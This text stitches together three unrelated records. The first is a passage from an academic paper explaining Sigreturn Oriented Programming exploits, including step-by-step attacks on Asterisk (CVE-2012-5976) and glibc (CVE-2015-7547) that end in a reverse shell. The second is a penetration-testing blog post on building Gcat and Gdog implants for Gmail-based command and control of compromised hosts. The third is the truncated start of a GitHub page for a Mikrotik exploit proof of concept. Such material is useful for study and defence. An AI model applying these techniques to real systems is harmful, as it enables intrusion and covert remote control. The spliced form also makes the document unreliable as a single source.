attacker where adding\nNULL bytes is possible.\n3. The attacker has to know the address of a piece of data he controls. This can either\nbe on the stack or in any other user controlled location e.g. some buffer.\n\fAn Overview of Sigreturn Oriented Programming 2079\n4. Either the address of a sigreturn gadget or the address of a syscall gadget and a way\nto set the AX\/EAX\/RAX to the right value have to be known.\nThe preconditions 1 and 2 can be met with a simple stack over\u00afow, provided that the\nvulnerable code allows NULL bytes. The precondition 3 can be met easily in most cases if\nthe exact version of the program is known and the application is not compiled as position\nindependent executable, since the location of buffers and other data pieces can be looked\nup by debugging the exact same version of the program locally. If this is not possible or\nthe program was compiled using the PIE \u00afag, a memory disclosure vulnerability may be\nneeded to get a valid address. As mentioned earlier, precondition 4 can be met trivially for\nsystems with sigreturn gadgets at \u00aexed locations. On other systems, the same restrictions\nas for precondition 3 apply.\nThe attack \u00afow with this \u00afavor of SROP looks as follows [BB14]:\n1. The stack is overwritten by the attacker using a vulnerability.\n2. When the program executes a return instruction, the program \u00afow is redirected to\nthe sigreturn gadget by an overwritten instruction pointer stored on the stack.\n3. The sigreturn call loads all register values from the stack. This way, the registers can\nbe prepared for using an execve system call with pointers to the attacker controlled\ndata as arguments.\n4. The application selected by the attacker can then be executed by using the gadget to\nplace another system call. This way, the attacker can for example spawn a shell.\nIf the attacker wants to perform more complex operations than spawning a shell or starting\nsome other program, step 3 can be changed to call mprotect to make the user controlled\ndata executable. By setting the instruction pointer in the signal frame to the user controlled\ndata, arbitrary code can then be executed.\n2.2 SROP Chain\nThis attack is far more complicated, but has other preconditions which can make it more\nsuitable for some situations. Because of differing system call numbers, it only works as\ndepicted with x86 64 Linux versions. The attack should also work with small modi\u00aeca-\ntions on x86, OSX BSD and ARM in thumb mode but additionally needs a way to set\nthe appropriate register (EAX\/RAX\/R7) to 3 for a read call or to the correct value for a\nsigreturn call, either with a system call or an additional gadget [W3]. The exact reason for\nthis will be made clear following the presentation of the attack. The preconditions are as\nfollows [BB14]:\n1. The attacker needs a way to control the instruction pointer, e.g. through a return\ninstruction on stack overwritten by the attacker.\n\f2080 Re\u0301mi Mabon\n2. The stack pointer has to be located on data controlled by the attacker where adding\nNULL bytes is possible.\n3. The address of a syscall and return gadget has to be known.\n4. The RAX register has to be set to 15 at the beginning.\n5. The location of any writable page in memory has to be known.\n6. The data sent to a pipe, \u00aele or socket with a known \u00aele descriptor number is con-\ntrolled by the attacker.\nFor the preconditions 1 to 3, the same restrictions as in the previous section apply but the\nprecondition 4 is far easier to match. Since the content and location of this page don\u2019t mat-\nter, any random page in the data section of the program can be picked. Even if the program\nchanges and the data section moves a bit, the attack is not affected as long as the selected\npage is still a valid writable page. This way, the exact same attack can work for different\nversions of a program and can in some cases even work for other programs, as long as\nthere is a writable page at the same place. Precondition 5 can be more complicated to meet\ndepending on the situation. In cases where the attacker has access to the standard input\nstream of the program, for example when exploiting a binary with a setuid bit to escalate\nprivileges, this is trivial. On the other hand, when exploiting a remote code execution vul-\nnerability on a web server which may have hundreds of open connections, this can be far\nmore dif\u00aecult. The dif\u00aeculty is mitigated a little by the fact that \u00aele descriptor numbers are\nalways allocated in sequence and that the data can be sent over multiple connections. For\nexample, if it is known that probably less then 50 users are connected to a web service, one\ncould pick the \u00aele descriptor number 50 and send the needed data over 50 connections. If\nthe initial assumption is right, one of the connections should get the \u00aele descriptor number\n50 which would lead to success.\nTo perform this attack, a chain of sigreturn and other system calls is combined with user\nsupplied data read from the \u00aele descriptor to execute arbitrary code. The concrete steps for\nthis are as follows, a graphical overview can be seen in [BB14].\n1. Using a stack over\u00afow vulnerability, the return pointer of a function is replaced\nwith a pointer to the sigreturn gadget. If only a syscall gadget is available, the RAX\nregister has to be set to 15 so that the sigreturn system call is executed. A signal\nframe \u00aelled only with zero values except the following content has to be placed\nright beneath it.\na) Stack pointer(RSP): Address of the writable page.\nb) Instruction pointer(RIP): Address of the syscall and return gadget.\nc) Akkumulator register(RAX): System call number for read.\nd) RDI register: File descriptor number, where to read from.\ne) RSI register: Address of the writable page, where to write to.\nf) RDX register: 306, number of bytes to read.\n\fAn Overview of Sigreturn Oriented Programming 2081\n2. After the sigreturn gadget is executed, the syscall and return gadget is executed\nagain because of the instruction pointer set in the frame. Because of the values in\nthe registers, the system call read is executed which can write up to 306 bytes from\nthe data received on the \u00aele descriptor to the writable page. The second part of the\nexploit is now sent over the \u00aele descriptor. This part contains the address of the\nsyscall and return gadget three times, then a signal frame and following this, one\ncan include arbitrary code or information. The amount of data received has to be\n306 bytes for the next steps to work.\n3. After having received the data, the read function returns with the number of bytes\nread in the RAX register. Our writable page is populated with the data that was sent\nand the stack pointer points to the beginning of our writable page. This leads to\nanother call to the syscall function. Because of the value 306 returned by the read\nfunction, the system call syncfs is executed. This system call should always return\nwith 0, the syscall number of read on x86 64, in the RAX register, as long as the \u00aele\ndescriptor is still valid.\n4. Another system call is executed due to the pointer on the stack. The value 0 in the\nRAX register leads to another read call. This time, the data sent is unimportant, the\nonly thing that matters is that exactly 15 bytes are sent. This leads to RAX containing\nthe value 15, the system call number for sigreturn .\n5. Our last pointer initiates yet another system call. This time, the value 15 leads to\nanother sigreturn call. The content of the following signal frame can be chosen\naccording to ones need. One good option is executing an execve call with pointers\nto the data below the signal frame as arguments, another interesting option is calling\nmprotect to make the data below the frame executable.\n6. The selected system call is executed. Either we are already done because we initiated\nexecve directly, or we now have attacker controlled executable code at a known\nlocation which makes further exploitation trivial.\nAs could be seen, this technique uses syncfs to set the RAX register to 0 for a read call\nwhich \u00aenally enables the attacker to perform a sigreturn call. Therefor, this method is\nmore dif\u00aecult on other systems, since the read system call is executed with the value 3 on\nmost. Of course if a sigreturn gadget is available, the syncfs and read call can be skipped\naltogether and the rest of this technique should work on all common systems. This is es-\npecially interesting on Android versions below 5.0 since they mostly use the ARM Linux\nkernel versions below 3.11 which maps a sigreturn call at a known address for all pro-\ncesses [BB14, An].\n2.3 Conclusion\nAs could be seen in this section, using sigreturn during attacks is quite powerfull. With\nthe use of a single gadget, arbitrary code can be executed with preconditions which can\n\f2082 Re\u0301mi Mabon\nbe ful\u00aelled easily in some cases. What makes it especially interesting is, that as long as\nthe preconditions are met, the internal structure of an application almost doesn\u2019t matter for\nSROP based attacks.\n3 Asterisk Exploit\nThe Asterisk Exploit is made possible by a stack consumption vulnerability with the CVE\nnumber \u201c2012-5976\u201d [Vua], for which a ROP remote execution attack was presented in\n[As]. The vulnerability being used lies in the HTTP Asterisk Management Interface and\nis due to an alloca call with a remotely supplied Content-Length value when receiving\na HTTP POST header. The dif\u00aeculty in exploiting it relies in the fact, that the allocated\nbuffer is \u00aelled with the fgets method, which makes it impossible to wrap the stack pointer\naround to a location higher on the stack, since fgets doesn\u2019t allow values greater than\n0x7FFFFFFF. This means, that it isn\u2019t possible to alter the stack of the thread which\ncreated the buffer. The way around this is to create a second connection to the management\ninterface to start an additional thread. As long as no other thread was created in between,\nthe distance between the stack of the \u00aerst connection to the stack of the second connection\nis de\u00aened in AST STACKSIZE and is exactly 0x3C000. By using a greater value, one can\ncreate a buffer on the \u00aerst connection which contains the stack of the second connection.\nThe steps to overwrite the return instruction pointer and other parts of the stack are therefor\nas follows [As]:\n1. Creating two remote connections to the Asterisk Management Interface.\n2. Sending a POST header with the Content-Length set to 0x3C900 to the \u00aerst connec-\ntion.\n3. Sending approximately 0x700 bytes of data to the \u00aerst connection.\n4. Sending a POST header with the Content-Length set to 0x200 bytes to the second\nconnection.\nBy sending the right value of bytes, the buffer pointer of the \u00aerst thread can be placed\ndirectly above the return instruction pointer of the IO getline info method of the second\nthread. Placing it there is essential, since the RAX register then contains the number of\nbytes read when our payload is executed, which is necessary to ful\u00aell precondition 4 men-\ntioned in section 2.2. Now it is time to send the \u00aerst SROP payload:\n3.1 First SROP Payload\nTo create the \u00aerst SROP payload, we \u00aerst need to know the address of a syscall and return\ngadget, the location of a writable page in memory and the number of a \u00aele descriptor on\nwhich data can be sent.\nSince Asterisk was deployed on a server with Debian 7.9, getting the address of a syscall\n\fAn Overview of Sigreturn Oriented Programming 2083\nand return gadget is trivial, as this distribution still uses a vsyscall page to provide some\nsystem functions [BB14]. If this wasn\u2019t the case, we would have to \u00aend a syscall and return\ngadget in the binary. This can be done with tools such as ROPgadget [Gi].\nTo \u00aend a writable page, we just have to use the readelf utility on the Asterisk binary [re].\nThis way, the different sections of the binary are displayed. Any page in the .data and .bss\nsection can be used.\nThe \u00aenal requirement is a valid \u00aele descriptor number to which we can write. While no\nusable \u00aele descriptor number is known, we can work around this as was described in\nsection 2.2 by using many connections to the server. These connections should be opened\nbefore executing the \u00aerst payload as the read call will return with an error if it is applied\nto a \u00aele descriptor number which isn\u2019t opened yet.\nThe \u00aerst payload can now be created as was explained in section 2.2 with the values we\nselected before. To create the concrete signal frame, one can either use the SROP library\nreferred to in [MP15] or, since it is the same as a context frame, one can use the ucontext\nstruct which is de\u00aened in ucontext.h.\nAfter having sent the \u00aerst payload to the \u00aerst connection, the \u00aerst payload can be executed\nby sending 15 bytes to the second connection and closing it.\n3.2 Second Payload\nThe second thread should now be waiting on 306 bytes of data on the connection to which\nthe selected \u00aele descriptor number belongs. To continue the exploit, we have to create the\nsecond payload as described in section 2.2. The values for the signal frame and the data\nbelow it can be chosen freely to execute any system call we like. For further exploitation,\nusing mprotect to make the writable page executable was chosen.\nOne problem building the second payload is, that only 306 bytes are available. This is\ncritical, since the ucontext struct alone has a size of 944 bytes. This problem can be solved\nby building a struct which only includes uc \ufb02ags, *uc link, uc stack, gregs and fpregs from\nthe ucontext struct since the rest of the struct is not needed for this application. This gives\nus a size of 232 bytes for the signal frame. Together with the 3 pointers to the syscall and\nreturn gadget and a pointer to our own data to execute it, this leaves us with 42 bytes for\nour own code. Since this isn\u2019t enough for most applications, a shellcode was added which\nsimply reads from the \u00aele descriptor number again and appends the result to the already\nexisting code. This way, an arbitrary amount of code can be executed as long as it \u00aets in\nthe .data or .bss section of the binary.\nAfter the second payload was constructed, it still has to be sent to the right connection\nand be read by the command issued by the \u00aerst payload. One thing which makes this\nmore dif\u00aecult is, that each connection we created spawned an own thread which tries to\nread from it already and which closes the connection as soon as it received a request and\nresponded to it. One option to get a window of opportunity in which our payload can read\nfrom the connection without being disturbed is to send a login request to the owner of the\nconnection. While the original owner checks if the account information is valid, one has\nenough time to communicate with our payload.\nTo \u00aenish our exploit, we have to go through all connections we opened and send every\n\f2084 Re\u0301mi Mabon\none a login request followed by our second payload, \u00aefteen random bytes and \u00aenally the\nshellcode we want to execute - in this case a reverse shell connection to another server\ntaken from [Li].\n4 Glibc Exploit\nIn early 2016, a stack based over\u00afow vulnerability with the CVE number \u201c2015-7547\u201d\nconcerning DNS address resolution in the widely used glibc was disclosed [Vub]. The\nexploitation path for this vulnerability was outlined in the patch notes on a glibc mailing\nlist and looks as follows [PA]:\n\u2022 The attacker needs to be able to control the DNS answers received by the program.\n\u2022 The program to be exploited must send out two DNS queries at once, e.g. for the A\nand AAAA records.\n\u2022 The attacker needs to respond to both DNS queries. The \u00aerst response needs to be\na valid DNS response with a length of 2048 bytes to completely \u00aell the allocated\nstack buffer. The second response now triggers a malloc call to create a new buffer\nwith 65535 bytes since the response buffer is allready full. To trigger the bug, the\nsecond response has to be \u00afawed in a way that gets glibc to retry the query.\n\u2022 Glibc then sends two more requests and reuses the 2048 bytes big buffer placed on\nthe stack to save the corresponding responses. Due to a bug, the size of the buffer is\nnow wrongly speci\u00aeed as the size of the heap buffer, 65535 bytes.\n\u2022 The attacker can now send an overlong response to the program which leads to an\nover\u00afow of the stack buffer.\nThis way, a Denial of Service attack against any target still using a vulnerable version of\nglibc is easily created.\nRemote code execution, as tested on Debian 7.9 using the newest glibc package before the\nbug \u00aex, isn\u2019t quite as simple. This is due to the fact that the address of the stack buffer\nused to save the result is saved on a part of the stack which is overwritten. Setting this\naddress to NULL leads to an assert failure and writing any value differing from the initial\none to it leads to a free call on this address, which causes an exception if the address\ndoesn\u2019t point to a valid freeable memory block. Therefore, a stack memory disclosure\nvulnerability is also needed to be able to enable code execution. This means that the only\nadditional preconditions needed for an address based SROP attack are a method to set RAX\nto 15 and a syscall gadget. These can be ful\u00aelled as described in section 2.1.\nTo create a remote code execution exploit, a simple exploitable program was implemented.\nThis program leaks a stack address to the attacker and then tries to resolve an address\nusing the getaddrinfo method of glibc as shown in [fj]. To make the exploitation easier,\nan attacker controlled server is set as the primary DNS server of the server which is to be\nattacked although this could be bypassed if the attacker is able to intercept the messages\nsent by the vulnerable program through some other way. The attacker can now trigger the\n\fAn Overview of Sigreturn Oriented Programming 2085\nvulnerability as previously described. The only restriction is, that the memory location\ncontaining the address of the initial response buffer has to be \u00aelled with the same value as\nbefore. This can be done by calculating the address using the leaked stacked address and\nsome \u00aexed offset. Finally, arbitrary code can be executed using SROP as shown in section\n2.1.\n5 Reusability of SROP Exploits\nTo demonstrate the reusability of SROP exploits, two simple exploitable programs were\ncreated, one for address based exploits and one for SROP chain exploits. These programs\nwere built in a way to ful\u00aell all conditions required for the speci\u00aec exploit.\n5.1 SROP Chain based Exploit\nThis program contains a large global char array, so that enough writable space is available.\nAfter starting, it simply executes a function with a return value of type long. This function\n\u00aerst allocates a variable from type long and a char array of size 10 on the stack, then asks\nhow many bytes it should receive and uses read to write the number of bytes speci\u00aeed to\nthe array. Since the number of bytes that should be written is provided by the user and isn\u2019t\nchecked by the program, a stack over\u00afow can be caused trivially by sending it a number\ngreater than the size of the array. Finally, the function returns the value of the previously\nallocated long variable.\nAfter taking a look at the previous Asterisk exploit, it was determined that the two SROP\nChain payloads only depend on three parameters:\n\u2022 The address of the syscall and return gadget.\n\u2022 The address of the writable page.\n\u2022 The \u00aele descriptor number used to communicate with the exploit.\nThe SROP payload creation instructions where therefor extracted from the Asterisk exploit\nto a library which then contains two simple to use functions to create the \u00aerst two payloads\nwith the aforementioned parameters. Since the \u00aenal shellcode also doesn\u2019t depend on the\napplication, this part could also be copied without altering it.\nThe address of the syscall and return gadget and of the writable page where acquired\nin the same way as for the Asterisk exploit. Since the exploit communicates with the\nexploitable program over the standard input stream, the \u00aele descriptor number was simply\nset to STDIN FILENO. This information was used to create the two SROP payloads.\nThe only thing left was adding some bytes before the \u00aerst SROP payload, so that the\npayload starts at the return address of the function, while taking care that the long variable\non the stack is overwritten by the value 15 to initiate a sigreturn call.\nThe exploit therefor only has to do the following steps:\n\f2086 Re\u0301mi Mabon\n1. Generate the two SROP payloads using the SROP library and the supplied addresses\nand \u00aele descriptor number.\n2. Start the exploitable program.\n3. Send the \u00aerst payload together with the additional bytes.\n4. Send the second payload.\n5. Send 15 random bytes.\n6. Send the \u00aenal shellcode.\nThis shows that quite a lot of the code of a SROP chain exploit can be reused from one\napplication to another. While, depending on the vulnerability, overwriting the return in-\nstruction pointer and the part below it on the stack may still be quite complicated, the rest\nof the exploit is easy, provided we have the following conditions:\n\u2022 One can communicate freely with a known \u00aele descriptor number\n\u2022 Finding the two required addresses isn\u2019t complicated by some defence mechanism.\n\u2022 There is a way to set the RAX value to 15, either with a gadget or by exploiting a\nfunction which returns a value from the stack using this register.\n5.2 SROP Exploit with known address\nThe same program was reused to demonstrate an SROP exploit with a known address with\nthe only difference being, that the global buffer was removed and a stack memory address\ndisclosure was added. As with the Chain based attack, all the SROP speci\u00aec code from the\nglibc attack was exported to the library, since it only depends on the location of a syscall\ngadget and the address of the stack at which the exploit is located. Reusing the known\naddress based SROP code from the glibc exploit worked without any modi\u00aecations and\ndue to the few restrictions, this should be the case for all vulnerabilities which give the\nsame preconditions.\n5.3 Conclusion\nCompared to ROP based exploits, where, after overwriting the stack, one still has to cre-\nate a ROP chain, which varies strongly from one program to another and which can be\nquite complicated and long depending on the available gadgets, using SROP is far simpler.\nWhen the preconditions of one of the two SROP \u00afavors are met, the entire ROP Chain can\nbe replaced by some reusable SROP based code which can be automatically generated by\na library.\n\fAn Overview of Sigreturn Oriented Programming 2087\n6 Impact of Defence Mechanisms\nThis section will examine how critical some defence mechanisms are for the usage of\nSROP exploits. The examined mechanisms are the default implementation of address\nspace layout randomization (ASLR) on Linux, position independent executables (PIE) and\nOxymoron.\n6.1 Address Space Layout Randomization\nASLR is a technique to map each part of a program to a random address on start. It is\nactivated by default on Linux since the kernel version 2.6.12 released in 2005. The problem\nwith the Linux implementation is, that for normal executables, while some parts of the\nprogram, like external libraries, are added at random addresses, the program code and the\ndata sections still always are at the same location [Ho]. Since the gadget requirements of\nSROP are quite low and the data sections can be used as writable pages, ASLR shouldn\u2019t\naffect SROP Chain exploits in most cases.\n6.2 Position Independent Executables\nBy compiling an application as a PIE, one can get Linux to put every section of the program\nat a random address. This makes SROP attacks far more dif\u00aecult, since the addresses of\nwritable pages and gadgets are not \u00aexed. But SROP attacks, like ROP attacks, might still\nbe possible if the program also has a memory disclosure vulnerability [As].\n6.3 Oxymoron\nOxymoron improves on ASLR by splitting every part of the program at the page level and\nplacing every page at a random location. With Oxymoron, \u00aending out an address through\na memory disclosure only helps locating one single page of a section, which makes ROP\nattacks very dif\u00aecult, since in most cases, a single page won\u2019t contain all the gadgets\nneeded to mount an attack. Because SROP attacks require only one or two gadgets and\nthe only other address information needed is the location of some writable page, an SROP\nattack on Oxymoron protected executables should still be possible in some cases [MP15].\n7 Conclusion\nThis paper demonstrates how SROP exploits can be created and that SROP makes stack\nover\u00afow based attacks easier compared to ROP attacks when some conditions are met.\nThis is especially true since large parts of the exploit may be reused between different\napplications which is shown by creating an application independent SROP library for the\n\f2088 Re\u0301mi Mabon\nx86 64 architecture.\nWhile some existing protection mechanisms can make SROP exploitation far more dif\u00ae-\ncult to perform, they still impede SROP attacks less than ROP attacks because of the lower\ngadget requirement. This makes SROP a real threat and highlights the need for SROP\nmitigation techniques for Unix systems like the ones proposed in [BB14].\nReferences\n[An] Android Versions - eLinux.org. http:\/\/elinux.org\/Android\\_Versions. Accessed:\n2016-02-16.\n[As] Asterisk Exploit \u2014 Exodus Intelligence. http:\/\/blog.exodusintel.com\/tag\/\nasterisk-exploit\/. Accessed: 2016-02-15.\n[BB14] Bosman, Erik; Bos, Herbert: Framing Signals a\u0302 A Return to Portable Shellcode. IEEE\nSymposium on Security and Privacy, pp. 243\u00b1258, 2014.\n[fj] fjserna\/CVE-2015-7547. https:\/\/github.com\/fjserna\/CVE-2015-7547\/blob\/\nmaster\/CVE-2015-7547-client.c. Accessed: 2016-04-25.\n[Gi] Github JonathanSalwan\/ROPgadget. https:\/\/github.com\/JonathanSalwan\/\nROPgadget\/. Accessed: 2016-02-15.\n[Ho] How Effective is ASLR on Linux Systems? http:\/\/securityetalii.es\/2013\/02\/\n03\/how-effective-is-aslr-on-linux-systems\/. Accessed: 2016-02-15.\n[Li] Linux\/x86-64 - Reverse TCP shell - 118 bytes. http:\/\/shell-storm.org\/shellcode\/\nfiles\/shellcode-857.php. Accessed: 2016-02-15.\n[MP15] Mithra, Zubin; P., Vipin: Evaluating the theoretical feasibility of an SROP attack against\nOxymoron. International Conference on Advances in Computing, Communications and\nInformatics, pp. 1872\u00b11876, 2015.\n[PA] PATCH CVE-2015-7547 \u2014 glibc getaddrinfo() stack-based buffer over\u00afow. https:\/\/\nsourceware.org\/ml\/libc-alpha\/2016-02\/msg00416.html. Accessed: 2016-04-25.\n[re] readelf - GNU Binary Utilities. https:\/\/sourceware.org\/binutils\/docs\/\nbinutils\/readelf.html. Accessed: 2016-02-15.\n[Vua] Vulnerability Summary for CVE-2012-5976. https:\/\/web.nvd.nist.gov\/view\/\nvuln\/detail?vulnId=CVE-2012-5976. Accessed: 2016-02-15.\n[Vub] Vulnerability Summary for CVE-2015-7547. https:\/\/web.nvd.nist.gov\/view\/\nvuln\/detail?vulnId=CVE-2015-7547. Accessed: 2016-04-25.\n[W3] W3Challs Syscall tables. https:\/\/w3challs.com\/syscalls\/. Accessed: 2016-02-16.\n\f"}
{"text":"#[1]Penetration Testing Lab \u00bb Feed [2]Penetration Testing Lab \u00bb\nComments Feed [3]Penetration Testing Lab \u00bb Command and Control \u2013 Gmail\nComments Feed [4]alternate [5]alternate [6]Penetration Testing Lab\n[7]WordPress.com\n[8]Skip to content\n[9]Penetration Testing Lab\nOffensive Techniques & Methodologies\n(BUTTON) Menu\n* [10]Methodologies\n+ [11]Red Teaming\no [12]Persistence\n* [13]Resources\n+ [14]Papers\no [15]Web Application\n+ [16]Presentations\no [17]Defcon\no [18]DerbyCon\no [19]Tools\n+ [20]Videos\no [21]BSides\no [22]Defcon\no [23]DerbyCon\no [24]Hack In Paris\n* [25]Contact\n+ [26]About Us\nPosted on [27]August 3, 2017\nCommand and Control \u2013 Gmail\nby [28]Administrator.In [29]Red Team.[30]1 Comment on Command and\nControl \u2013 Gmail\nGmail provides email functionality for users and businesses. This means\nthat traffic towards Gmail servers in most of the organisations is\npermitted. Red team operations from the other side needs to be as\nstealthy as possible therefore using legitimate protocols such as\n[31]ICMP and SMTP  in order to execute commands to a compromised host\nis essential. For that purpose there are two important tools on the web\nGcat and Gdog which both of them can use Gmail as a command and control\nserver.\nGcat\n[32]Gcat is python based framework that utilizes Gmail in order to act\na command and control server. The implant that is contained inside Gcat\nwill regularly beacon with the Gmail inbox and check if there are any\nnew messages with a campaign ID. If there are, the commands contained\nin these emails will be executed on the compromised host and when a new\nresponse is received this information it will be passed to the console.\nIn order to allow Gcat to communicate with Gmail the following settings\nneeds to be enabled.\nThe [33]Less secure apps Gmail setting needs to be turned on.\nGmail - Allow Less Secure Apps Gmail \u2013 Allow Less Secure Apps\nAdditionally the IMAP setting needs to be enabled as well from the\nGoogle account settings.\nGmail - IMAP Setting Enabled Gmail \u2013 IMAP Setting Enabled\nThe next step is to convert the implant.py file into an executable.\nThere are various ways to achieve that but the easiest is to create a\nsetup.py file which will contain the following code and use py2exe.\n# setup.py\nfrom distutils.core import setup\nimport py2exe\nsetup(console=['implant.py'])\nGcat - Setup File for Implant Gcat \u2013 Setup File for Implant\nRunning python.exe with the following arguments will create the\nexecutable.\nGcat - Convert Implant to Executable Gcat \u2013 Convert Implant to\nExecutable\nFrom the moment that the implant will executed on the host the attacker\nwould be able to send commands via Gmail.\nGcat - Running Implant Gcat \u2013 Running Implant\nThe following command will list the hosts that are running the implant.\nAnything before the Windows-post2008Server-6.2.9200-AMD64 is the ID.\nThis can be used in order to interact with the host and send command\nand also to view the output of these commands.\nGcat - Listing Compromised Hosts Gcat \u2013 Listing Compromised Hosts\nGcat gives the ability to execute CMD commands. Therefore it is\npossible to execute various commands in order to enumerate system\ninformation.\nGcat - Executing SystemInfo Command Gcat \u2013 Executing systeminfo Command\nBy specifying the job id the output of the command will be retrieved.\nGcat - System Info Gcat \u2013 System Info\nThe same applies for any other command like ipconfig.\nGcat - Executing CMD Commands Gcat \u2013 Executing CMD CommandsGcat - IP\nConfig Gcat \u2013 IP Config\nGdog\n[34]Gdog is the successor of Gcat and it is actually the same Command\nand Control tool but more advanced since it can retrieve geolocation\ninformation, it has keylogger functionality, it supports encrypted\ncommunication and various other features. However it has more\ndependencies since it requires the following modules to be installed in\norder to compile the client.py file into an executable:\n* [35]PyCrypto module\n* [36]WMI module\n* [37]Enum34 module\n* [38]Netifaces module\nInstallation of WMI and Enum34 can be done easily by downloading the\nnecessary archives and running the setup.py files with the install\nargument.\nWMI Module - Installation WMI Module \u2013 InstallationEnum34 Module\nInstallation Enum34 Module Installation\nThe same Gmail settings needs to be applied as with Gcat (IMAP & Less\nSecure Apps). Converting the client.py to an executable can be done\nwith the same code as long as all the modules are successfully\ninstalled and there are no errors.\n# setup.py\nfrom distutils.core import setup\nimport py2exe\nsetup(console=['client.py'])\nFrom the moment that the client.exe (implant) will executed on the\nremote host various commands can be sent through Gmail in an encrypted\nform.\nGdog - Encrypted Communication Gdog \u2013 Encrypted Communication\nThe following screenshots demonstrate some of the activities that Gdog\ncan perform:\nSystem Information:\nGdog - System Information Gdog \u2013 System Information\nMessage Box:\nGdog - Message Box Gdog \u2013 Message Box\nExecute Commands:\nGdog - net users job Gdog \u2013 net users jobGdog - net users Gdog \u2013 net\nusers\nDownload Files:\nGdog - Download Files Gdog \u2013 Download FilesGdog - Location of saved\nfile Gdog \u2013 Location of saved file\nResources\n[39]https:\/\/github.com\/byt3bl33d3r\/gcat\n[40]https:\/\/github.com\/maldevel\/gdog\n[41]https:\/\/github.com\/pyinstaller\/pyinstaller\n[42]http:\/\/www.pyinstaller.org\/\nRate this:\nShare this:\n* [43]Twitter\n* [44]Facebook\n* [45]LinkedIn\n* [46]Reddit\n* [47]Tumblr\n* [48]WhatsApp\n* [49]Telegram\n* [50]Pinterest\n* [51]Pocket\n* [52]Email\n*\nLike Loading...\nRelated\n[53]C&C[54]C2[55]Gcat[56]Gdog[57]Gmail[58]Pentesting[59]Red Team\n1 Comment\n1. Pingback: [60]Command and Control \u2013 Twitter | Penetration Testing\nLab\nLeave a Reply [61]Cancel reply\n\u0394\n_____________________________________________\n_____________________________________________\n_____________________________________________\n_____________________________________________\n_____________________________________________\n_____________________________________________\n_____________________________________________\n_____________________________________________\nPost navigation\n[62]Previous Previous post: Command and Control \u2013 ICMP\n[63]Next Next post: Command and Control \u2013 PowerShell\nFollow PenTest Lab\nEnter your email address to follow this blog and receive notifications\nof new articles by email.\nEmail Address: ____________________\n(BUTTON) Follow\nJoin 2,591 other subscribers\nSearch Topic\n____________________ (BUTTON) Search\nRecent Posts\n* [64]Persistence \u2013 Event Log\n* [65]Initial Access \u2013 search-ms URI Handler\n* [66]Persistence \u2013 Scheduled Task Tampering\n* [67]Persistence \u2013 Windows Telemetry\n* [68]Persistence \u2013 Service Control Manager\nCategories\n* [69]Coding (10)\n* [70]Exploitation Techniques (19)\n* [71]External Submissions (3)\n* [72]General Lab Notes (22)\n* [73]Information Gathering (12)\n* [74]Infrastructure (2)\n* [75]Maintaining Access (4)\n* [76]Mobile Pentesting (7)\n* [77]Network Mapping (1)\n* [78]Post Exploitation (13)\n* [79]Red Team (123)\n+ [80]Credential Access (3)\n+ [81]Defense Evasion (22)\n+ [82]Domain Escalation (5)\n+ [83]Domain Persistence (4)\n+ [84]Initial Access (1)\n+ [85]Lateral Movement (2)\n+ [86]Man-in-the-middle (1)\n+ [87]Persistence (34)\n+ [88]Privilege Escalation (17)\n* [89]Reviews (1)\n* [90]Social Engineering (11)\n* [91]Tools (7)\n* [92]VoIP (4)\n* [93]Web Application (14)\n* [94]Wireless (2)\nPentest Laboratories Discord\n* [95]Discord\nPen Test Lab Stats\n* 7,183,884 hits\n[96]Facebook Page\n[97]Facebook Page\n__________________________________________________________________\n[98]Blog at WordPress.com.\n* [99]Methodologies\n+ [100]Red Teaming\no [101]Persistence\n* [102]Resources\n+ [103]Papers\no [104]Web Application\n+ [105]Presentations\no [106]Defcon\no [107]DerbyCon\no [108]Tools\n+ [109]Videos\no [110]BSides\no [111]Defcon\no [112]DerbyCon\no [113]Hack In Paris\n* [114]Contact\n+ [115]About Us\n* [116]Comment\n* [117]Reblog\n* [118]Subscribe [119]Subscribed\n+ [120]Penetration Testing Lab\nJoin 2,289 other subscribers\n____________________\n(Sign me up) Sign me up\n+ Already have a WordPress.com account? [121]Log in now.\n*\n+ [122]Penetration Testing Lab\n+ [123]Customize\n+ [124]Subscribe [125]Subscribed\n+ [126]Sign up\n+ [127]Log in\n+ [128]Copy shortlink\n+ [129]Report this content\n+ [130]View post in Reader\n+ [131]Manage subscriptions\n+ [132]Collapse this bar\nLoading Comments...\nWrite a Comment...\n____________________________________________________________\n____________________________________________________________\n____________________________________________________________\n____________________________________________________________\nEmail (Required) ____________________\nName (Required) ____________________\nWebsite ____________________\nPost Comment\nIFRAME: [133]likes-master\n%d"}
{"text":"#[1]GitHub\n[2]Skip to content\n(BUTTON) Toggle navigation\n[3]Sign in\n(BUTTON)\n* (BUTTON) Product\n+ Actions\nAutomate any workflow\n+ Packages\nHost and manage packages\n+ Security\nFind and fix vulnerabilities\n+ Codespaces\nInstant dev environments\n+ Copilot\nWrite better code with AI\n+ Code review\nManage code changes\n+ Issues\nPlan and track work\n+ Discussions\nCollaborate outside of code\nExplore\n+ [4]All features\n+ [5]Documentation\n+ [6]GitHub Skills\n+ [7]Blog\n* (BUTTON) Solutions\nFor\n+ [8]Enterprise\n+ [9]Teams\n+ [10]Startups\n+ [11]Education\nBy Solution\n+ [12]CI\/CD & Automation\n+ [13]DevOps\n+ [14]DevSecOps\nResources\n+ [15]Learning Pathways\n+ [16]White papers, Ebooks, Webinars\n+ [17]Customer Stories\n+ [18]Partners\n* (BUTTON) Open Source\n+ GitHub Sponsors\nFund open source developers\n+ The ReadME Project\nGitHub community articles\nRepositories\n+ [19]Topics\n+ [20]Trending\n+ [21]Collections\n* [22]Pricing\n(BUTTON)\nSearch or jump to...\nSearch code, repositories, users, issues, pull requests...\nSearch\n____________________\nClear (BUTTON)\n[23]Search syntax tips\nProvide feedback\n(BUTTON)\nWe read every piece of feedback, and take your input very seriously.\n____________________________________________________________\n____________________________________________________________\n____________________________________________________________\n____________________________________________________________\n[ ] Include my email address so I can be contacted\n(BUTTON) Cancel (BUTTON) Submit feedback\nSaved searches\nUse saved searches to filter your results more quickly\n(BUTTON)\nName ____________________\nQuery ____________________\nTo see all available qualifiers, see our [24]documentation.\n(BUTTON) Cancel (BUTTON) Create saved search\n[25]Sign in\n[26]Sign up\nYou signed in with another tab or window. [27]Reload to refresh your\nsession. You signed out in another tab or window. [28]Reload to refresh\nyour session. You switched accounts on another tab or window.\n[29]Reload to refresh your session. (BUTTON) Dismiss alert\n(BUTTON)\n{{ message }}\n[30]BigNerd95 \/ [31]Chimay-Red Public\n* [32]Notifications\n* [33]Fork 226\n* [34]Star 641 (BUTTON)\nWorking POC of Mikrotik exploit from Vault 7 CIA Leaks\n[35]641 stars [36]226 forks 